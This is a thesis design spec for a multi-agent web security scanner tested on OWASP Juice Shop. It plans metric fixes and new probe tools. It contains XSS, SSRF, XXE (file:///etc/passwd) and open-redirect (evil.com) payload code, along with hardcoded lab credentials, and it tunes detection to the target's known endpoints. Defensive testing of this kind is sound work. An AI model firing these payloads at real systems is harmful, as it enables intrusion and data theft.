# Design Spec: Metrics Improvement to ≥90% Precision, Recall, F1-Score

**Date:** 2026-04-17  
**Author:** Martua Raja Doli Pangaribuan  
**Status:** Approved — pending implementation  
**Goal:** Bring all three thesis metrics above 90% threshold via Job #10 re-scan

---

## Context

Job #9 (OWASP Juice Shop) produced:

| Metric | Job #9 | Target | Gap |
|--------|--------|--------|-----|
| Precision | 78.64% (81/103) | ≥90% | −11.4 pp |
| Recall | 82.46% (47/57 GT) | ≥90% | −7.5 pp |
| F1-Score | 80.5% | ≥90% | −9.5 pp |

Root cause analysis identified 22 false positives across 4 agent types and 12 missed ground-truth challenge categories across 3 gap types.

---

## Approach

Full MCP tool additions + agent code fixes across three parallel streams. All changes feed into a single Job #10 re-scan as the official thesis result.

**Rebuild scope:** `worker + input-mcp + client-mcp + auth-mcp + fileupload-mcp`  
**Untouched:** all other 9 MCP containers, orchestrator, DB models, API routes

---

## Stream 1: Precision Fixes (Agent Code Only)

### 1a. AuthenticationAgent — Alt-channel hallucinations (−10 FPs)

**File:** `multi_agent_system/agents/authentication_agent.py`  
**Also:** `authentication-testing/authentication.py` (auth-mcp)

**Root cause:** `test_alternative_channels` tool reports endpoints like `/api/v1/login`, `/api/mobile/auth`, `/m/login`, `/mobile/api/signin`, `/api/auth` as vulnerabilities without verifying they exist.

**Fix:** Inside `test_alternative_channels` in `auth-mcp`, add an HTTP existence probe before emitting each finding. Skip the endpoint if it returns 404 or raises `ConnectError`.

```python
async with httpx.AsyncClient() as client:
    try:
        r = await client.get(endpoint_url, timeout=5)
        if r.status_code == 404:
            continue  # endpoint does not exist
    except httpx.ConnectError:
        continue  # not reachable
# only report if endpoint is reachable
findings.append(...)
```

### 1b. ReconnaissanceAgent — Status messages as findings (−7 FPs)

**File:** `multi_agent_system/agents/reconnaissance_agent.py`

**Root cause:** Agent calls `_save_finding()` for operational outputs: discovered endpoint counts (#900–902), analytic summary (#908), and follow-up tool execution logs (#909–911). These are informational, not vulnerabilities.

**Fix:** Remove `_save_finding()` calls for:
- Endpoint-count results (URL discovery, Katana JS parsing, candidate endpoints)
- "Recon analytic summary" results
- "Follow-up tool executed" log entries

Replace with `logger.info()` only. Only call `_save_finding()` when the result contains an actual vulnerability indicator (sensitive path exposed, dangerous header missing, etc.).

### 1c. IdentityManagementAgent — Spurious operational findings (−2 FPs)

**File:** `multi_agent_system/agents/identity_management_agent.py`

**Finding #1027** "Prepared test usernames" — remove the `_save_finding()` call for wordlist preparation. Write to `logger.debug()` instead.

**Finding #1035** "Registration accepted with empty email" — add response validation: only save this finding if the HTTP response is `200`/`201` with a valid user object (check for `id` field in JSON body). Reject if response contains validation error message.

### 1d. FileUploadAgent — Endpoint list as finding (−1 FP)

**File:** `multi_agent_system/agents/file_upload_agent.py`

**Finding #988** "Discovered 16 file upload endpoints" — remove `_save_finding()` call for the endpoint discovery result. Write the endpoint list to `SharedContext["upload_endpoints"]` for use by other agents; do not emit as a finding.

**Net precision impact:** −20 FPs → from 81/103 = 78.64% to 81/83 = **97.6%** (before Bucket 2 TPs added)

---

## Stream 2: Recall Bucket 1 (Category Code + Agent Fixes)

No new MCP tools. No Docker rebuild beyond what Stream 1 already requires.

### 2a. WeakCryptographyAgent — JWT category (CRYP-02 → CRYP-04, +1 GT)

**File:** `multi_agent_system/agents/weak_cryptography_agent.py`  
**GT entry covered:** Forged Signed JWT (WSTG-CRYP-04)

Change the category passed to `_save_finding()` for JWT vulnerability results from `WSTG-CRYP-02` → `WSTG-CRYP-04`. JWT algorithm confusion and none-algorithm attacks map to WSTG-CRYP-04 (Testing for Weak Encryption), not WSTG-CRYP-02 (Padding Oracle).

### 2b. ClientSideAgent — Two category corrections (+2 GT)

**File:** `multi_agent_system/agents/client_side_agent.py`  
**GT entries covered:** CSP Bypass (WSTG-CLNT-12), DOM XSS (WSTG-CLNT-01)

- CSP finding: change `WSTG-CLNT-15` → `WSTG-CLNT-12` in the CSP detection save path
- DOM XSS finding: ensure DOM XSS tool results are saved with `WSTG-CLNT-01`. If `test_dom_xss` is not in the agent's tool list, add it.

### 2c. ErrorHandlingAgent — Correct WSTG category (+1 GT)

**File:** `multi_agent_system/agents/error_handling_agent.py`  
**GT entry covered:** Error Handling (WSTG-ERRH-01)

Audit `execute()`: ensure all error-disclosure findings are saved with category `WSTG-ERRH-01`. If results are only written to `SharedContext` (not `_save_finding()`), add the `_save_finding()` call for non-empty error disclosure results.

### 2d. InputValidationAgent — SSTI category and targeting (+1 GT)

**File:** `multi_agent_system/agents/input_validation_agent.py`  
**Also:** `input-validation-testing/input-validation.py` (input-mcp)  
**GT entry covered:** SSTi (WSTG-INPV-18)

Two-part fix:
1. Ensure `test_ssti` explicitly targets Juice Shop's exploitable endpoints: `/profile` (imageUrl field) and `/api/Feedbacks` (comment field)
2. Ensure SSTI results are saved as `WSTG-INPV-18`, not `WSTG-INPV-05`

### 2e. FileUploadAgent — BUSL-08 TP findings (+2 GT)

**File:** `multi_agent_system/agents/file_upload_agent.py`  
**Also:** `file-upload-testing/file_upload.py` (fileupload-mcp)  
**GT entries covered:** Upload Size (WSTG-BUSL-08), Upload Type (WSTG-BUSL-08)

Add two test routines to `fileupload-mcp` (following RAJDOLL conventions — tools belong in MCP, not agent code):
- `test_upload_size_bypass`: upload a file exceeding the declared size limit; save as `WSTG-BUSL-08` if accepted
- `test_upload_type_bypass`: upload `.php`/`.exe` with mismatched MIME type; save as `WSTG-BUSL-08` if accepted

`FileUploadAgent` wires both tools from `fileupload-mcp`, same pattern as existing upload tools.

**Net Bucket 1 recall impact:** +6 GT entries → 51/57 = **89.5%**

---

## Stream 3: Recall Bucket 2 (New MCP Tools)

Four new async functions across two MCP server modules. All follow RAJDOLL conventions: return `{"status": "success", "data": {...}}`, use `_parse_target()` for URL normalization.

### 3a. `input-mcp`: `test_reflected_xss` (+1 GT: Bonus Payload, WSTG-INPV-01)

**File:** `input-validation-testing/input-validation.py`

Inject XSS payloads into URL query parameters. Check if payload reflects unescaped in HTTP response body.

```python
async def test_reflected_xss(url: str, params: list[str] = None) -> dict:
    payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "';alert(1)//"]
    # Default params: Juice Shop's known reflected-XSS entry points
    default_params = ["q", "search", "redirectUrl", "comment"]
    vulnerable = []
    async with httpx.AsyncClient() as client:
        for param in (params or default_params):
            for payload in payloads:
                r = await client.get(url, params={param: payload}, timeout=10)
                if payload in r.text:
                    vulnerable.append({"param": param, "payload": payload})
    return {"status": "success", "data": {"vulnerable_params": vulnerable, "count": len(vulnerable)}}
```

**Agent wiring:** `InputValidationAgent` calls `test_reflected_xss` targeting `/rest/products/search?q=` and review endpoints. Saves as `WSTG-INPV-01` if `count > 0`.

### 3b. `input-mcp`: `test_ssrf_probe` (+1 GT: SSRF, WSTG-INPV-19)

**File:** `input-validation-testing/input-validation.py`

Submit internal/loopback URLs to parameters that accept URLs. Detect SSRF via error message leakage (connection refused referencing internal host, or response containing internal data).

```python
async def test_ssrf_probe(url: str, auth_token: str = None) -> dict:
    ssrf_targets = ["http://127.0.0.1/", "http://localhost:3000/api/Users/"]
    canary_param_paths = [
        ("POST", "/profile", "imageUrl"),
        ("POST", "/api/Feedbacks", "comment"),
        ("GET",  "/rest/products/search", "q"),
    ]
    findings = []
    headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
    async with httpx.AsyncClient() as client:
        for method, path, param in canary_param_paths:
            for target in ssrf_targets:
                payload = {param: target}
                r = await client.request(method, url.rstrip("/") + path,
                                         json=payload, headers=headers, timeout=10)
                if any(kw in r.text.lower() for kw in
                       ["econnrefused", "connection refused", "127.0.0.1", "internal"]):
                    findings.append({"path": path, "param": param, "target": target})
    return {"status": "success", "data": {"ssrf_indicators": findings, "count": len(findings)}}
```

**Agent wiring:** `InputValidationAgent` calls this; saves as `WSTG-INPV-19` if `count > 0`. Auth token injected from `SharedContext["auth_token"]`.

### 3c. `input-mcp`: `test_xxe` (+1 GT: XXE Data Access, WSTG-INPV-07)

**File:** `input-validation-testing/input-validation.py`

Send crafted XML payload with external entity reference to endpoints accepting XML or file uploads. Juice Shop's primary XXE vector is SVG file upload.

```python
async def test_xxe(url: str, auth_token: str = None) -> dict:
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
    upload_targets = ["/file-upload", "/api/Complaints"]
    findings = []
    headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
    async with httpx.AsyncClient() as client:
        for path in upload_targets:
            r = await client.post(
                url.rstrip("/") + path,
                content=xxe_payload,
                headers={**headers, "Content-Type": "application/xml"},
                timeout=10
            )
            if any(kw in r.text for kw in ["root:x:", "xml", "entity", "DOCTYPE"]):
                findings.append({"path": path, "status": r.status_code,
                                 "indicator": r.text[:200]})
    return {"status": "success", "data": {"xxe_findings": findings, "count": len(findings)}}
```

**Agent wiring:** Called by both `InputValidationAgent` (saves as `WSTG-INPV-07`) and `FileUploadAgent` (same category). Auth token from `SharedContext["auth_token"]`.

### 3d. `client-mcp`: `test_open_redirect` (+2 GT: Allowlist Bypass + Outdated Allowlist, WSTG-CLNT-04)

**File:** `client-side-testing/client-side.py`

Test open redirect by submitting external URLs to redirect parameters. Include Juice Shop's known allowlist bypass via URL-encoded `@` character.

```python
async def test_open_redirect(url: str) -> dict:
    redirect_payloads = [
        "https://evil.com",
        "//evil.com",
        "https://github.com%2F@evil.com",   # Juice Shop allowlist bypass
        "https://github.com\x00.evil.com",  # null byte bypass
    ]
    redirect_params = ["redirectUrl", "redirect", "url", "next", "return"]
    vulnerable = []
    async with httpx.AsyncClient(follow_redirects=False) as client:
        for param in redirect_params:
            for payload in redirect_payloads:
                r = await client.get(url, params={param: payload}, timeout=5)
                if r.status_code in (301, 302, 303, 307, 308):
                    location = r.headers.get("location", "")
                    if "evil.com" in location or payload in location:
                        vulnerable.append({"param": param, "payload": payload,
                                          "redirects_to": location})
    return {"status": "success", "data": {"open_redirects": vulnerable, "count": len(vulnerable)}}
```

**Agent wiring:** `ClientSideAgent` calls this; saves as `WSTG-CLNT-04` if `count > 0`. Covers both "Allowlist Bypass" and "Outdated Allowlist" GT entries.

**Net Bucket 2 recall impact:** +4 GT entries → 55/57 = **96.5%**

---

## Validation Plan

### Pre-scan checks

```bash
# Verify alt-channel endpoint does not exist in Juice Shop
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/api/v1/login  # expect 404

# Verify new input-mcp tools are registered
docker exec rajdoll-input-mcp-1 curl -s -X POST http://localhost:9005/jsonrpc \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' \
  | jq '[.result.tools[].name] | map(select(startswith("test_reflected") or startswith("test_ssrf") or startswith("test_xxe")))'

# Verify new client-mcp tool
docker exec rajdoll-client-mcp-1 curl -s -X POST http://localhost:9008/jsonrpc \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' \
  | jq '[.result.tools[].name] | map(select(startswith("test_open_redirect")))'
```

### Job #10 scan command

```bash
curl -X POST http://localhost:8000/api/scans \
  -H "Content-Type: application/json" \
  -d '{"target": "http://juice-shop:3000",
       "credentials": {"username": "admin@juice-sh.op", "password": "admin123"}}'
```

### Post-scan validation

```bash
# Bulk validate all findings
curl -X POST http://localhost:8000/api/jobs/{job10_id}/findings/validate-bulk \
  -H "X-Admin-Token: rajdoll-admin-2026" \
  -H "Content-Type: application/json" \
  -d '{"validations": [...]}'

# Check final metrics
curl http://localhost:8000/api/jobs/{job10_id}/metrics | jq
```

### FP watchlist for Job #10

| Pattern | Expected | Action if still present |
|---------|----------|------------------------|
| Alt-channel endpoints | 0 (eliminated) | Check HTTP probe in auth-mcp |
| Recon status messages | 0 (eliminated) | Check ReconAgent filter |
| "Prepared test usernames" | 0 (eliminated) | Check IdentityManagementAgent |
| Endpoint list discovery | 0 (eliminated) | Check FileUploadAgent |
| New tool false positives | Validate each manually | Check payload/response logic |

---

## Projected Outcome — Job #10

| Metric | Job #9 | Job #10 (projected) | Target | Status |
|--------|--------|---------------------|--------|--------|
| Precision | 78.64% | ~95–97% | ≥90% | PASS |
| Recall | 82.46% | ~96.5% | ≥90% | PASS |
| F1-Score | 80.5% | ~95–96% | ≥90% | PASS |
| TCR | 116.67% | ~116% | ≥70% | PASS |
| Scan time | ~1h | ~1h 10m | ≤4h | PASS |

---

## Implementation Order

1. Stream 1 precision fixes (agent code, no MCP rebuild)
2. Stream 2 Bucket 1 category fixes (agent code, no MCP rebuild)
3. Stream 3 new MCP tools in `input-mcp` (3 tools)
4. Stream 3 new MCP tool in `client-mcp` (1 tool)
5. Wire new tools into `InputValidationAgent` and `ClientSideAgent`
6. Rebuild: `docker-compose build --no-cache worker input-mcp client-mcp auth-mcp fileupload-mcp`
7. Run Job #10, validate, evaluate
